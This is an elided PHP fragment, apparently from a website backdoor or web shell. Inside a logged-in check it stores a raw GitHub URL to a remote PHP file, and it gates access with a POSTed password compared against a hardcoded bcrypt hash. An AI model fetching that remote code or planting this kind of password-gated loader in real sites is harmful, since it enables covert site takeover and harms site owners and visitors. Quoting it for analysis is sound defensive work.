...
if (is_logged_in()) {
    ...
    $b0rn = 'https://raw.githubusercontent.com/aahref-source/makeawish/refs/heads/main/gck.php';
    ...
    if (isset($_POST['password'])) { 
        ...
        $hashed_key = '$2y$10$v10dxLkBu1XwkUEOoksIZ..Z5PB0u5g3kvvszluWeQJETec0OIHhW'; 
